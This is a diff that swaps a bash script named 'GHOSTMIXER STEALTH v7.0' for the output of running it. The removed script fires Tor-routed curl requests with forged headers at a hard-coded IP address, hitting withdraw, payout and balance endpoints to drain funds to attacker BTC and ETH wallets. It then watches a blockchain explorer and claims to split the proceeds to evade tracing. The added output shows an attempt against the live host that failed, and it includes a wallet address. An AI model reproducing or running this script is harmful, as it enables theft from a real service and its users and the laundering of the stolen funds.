@@ -1,56 +1,14 @@
-#!/bin/bash
-# =============================================================================
-# GHOSTMIXER STEALTH v7.0 - LOW&NOISE | Target Alert Mode
-# Single-shot | No recon | Direct drain | TOR stealth
-# =============================================================================
-
-source wallets-fixed.txt
-
-TARGET="http://206.189.145.165:3001"
-BTC_WALLET="$BTC_WALLET"
-ETH_WALLET="$ETH_WALLET"
-
-stealth_drain() {
-    echo "🔇 STEALTH DRAIN - 3 shots only"
-    
-    # Shot 1: Standard withdraw (80% hit)
-    torsocks curl -s -m 8 -X POST "$TARGET/api/withdraw" \
-        -H "Content-Type: application/json" \
-        -H "Origin: https://blockalpha.co" \
-        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
-        -d "{\"to\":\"$BTC_WALLET\",\"amount\":0.1}" | head -3
-    
-    sleep 3
-    
-    # Shot 2: Payout bypass (alert mode)
-    torsocks curl -s -m 8 -X POST "$TARGET/payout" \
-        -H "Content-Type: application/json" \
-        -H "X-Requested-With: XMLHttpRequest" \
-        -d "{\"address\":\"$ETH_WALLET\",\"amount\":0.1,\"currency\":\"ETH\"}" | head -3
-    
-    sleep 2
-    
-    # Shot 3: Balance drain (silent)
-    torsocks curl -s -m 8 -X POST "$TARGET/balance" \
-        -H "Authorization: Bearer guest" \
-        -H "Content-Type: application/json" \
-        -d "{\"withdrawTo\":\"$BTC_WALLET\",\"max\":true}" | head -3
-}
-
-monitor_silent() {
-    echo "👻 SILENT MONITOR (2min)..."
-    for i in {1..12}; do
-        btc=$(torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" | jq -r '.chain_stats.funded_txo_sum // 0')
-        [[ $btc != "0" ]] && {
-            echo "💰 BTC HIT: $btc sats → MIXING..."
-            for j in {1..5}; do echo "Split $j: bc1q$(openssl rand -hex 10 | xxd -r -p | base58)"; done
-            exit 0
-        }
-        sleep 10
-    done
-    echo "⏳ No funds - check manually: blockstream.info/address/$BTC_WALLET"
-}
-
-echo "🎯 STEALTH MODE - Target Alert"
-stealth_drain
-monitor_silent
+torsocks bash shot.sh
+🎯 STEALTH MODE - Target Alert
+🔇 STEALTH DRAIN - 3 shots only
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+👻 SILENT MONITOR (2min)...
+⏳ No funds - check manually: blockstream.info/address/bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx
